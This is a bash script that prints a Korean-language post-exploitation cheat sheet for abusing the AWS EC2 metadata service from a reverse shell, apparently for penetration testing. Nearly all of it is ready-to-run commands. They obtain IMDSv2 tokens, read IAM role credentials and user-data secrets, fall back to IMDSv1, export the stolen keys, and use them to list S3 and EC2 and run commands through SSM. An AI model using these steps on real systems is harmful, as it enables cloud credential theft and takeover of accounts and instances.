#!/bin/bash
echo "============================================================"
echo "☁️  AWS EC2 메타데이터 서비스 악용"
echo "============================================================"
echo ""
echo "리버스 쉘에서 실행:"
echo ""

echo "1. IMDSv2 토큰 획득 (새로운 방식)"
echo "------------------------------------------------------------"
cat << 'EOF'
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
echo $TOKEN
EOF
echo ""

echo "2. IAM Role 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
EOF
echo ""

echo "3. IAM 자격증명 획득"
echo "------------------------------------------------------------"
cat << 'EOF'
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
EOF
echo ""

echo "4. 만약 IMDSv2가 막혀있다면 IMDSv1 시도 (레거시)"
echo "------------------------------------------------------------"
cat << 'EOF'
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
EOF
echo ""

echo "5. User Data 확인 (시크릿이 있을 수도)"
echo "------------------------------------------------------------"
cat << 'EOF'
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null
# 또는 v1
curl http://169.254.169.254/latest/user-data 2>/dev/null
EOF
echo ""

echo "============================================================"
echo "만약 IAM 자격증명을 얻었다면:"
echo "============================================================"
echo ""
cat << 'EOF'
# AccessKeyId, SecretAccessKey, Token을 저장
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# AWS CLI로 권한 확인
aws sts get-caller-identity

# S3 접근 가능?
aws s3 ls

# EC2 인스턴스 정보
aws ec2 describe-instances

# Systems Manager로 명령 실행 가능?
aws ssm send-command --document-name "AWS-RunShellScript" --parameters commands=["whoami"]
EOF
echo ""

echo "============================================================"
echo "그레이박스 환경이라면 알아야 할 것들:"
echo "============================================================"
echo ""
echo "1. EC2 인스턴스에 연결된 IAM Role 이름?"
echo "2. Security Group 설정?"
echo "3. SSH 키 페어 이름?"
echo "4. RDS 데이터베이스 엔드포인트?"
echo "5. 다른 AWS 리소스 (S3, Lambda, etc)?"
echo ""
echo "→ 이 정보들이 있으면 더 많은 공격 경로 가능"
echo ""
echo "============================================================"
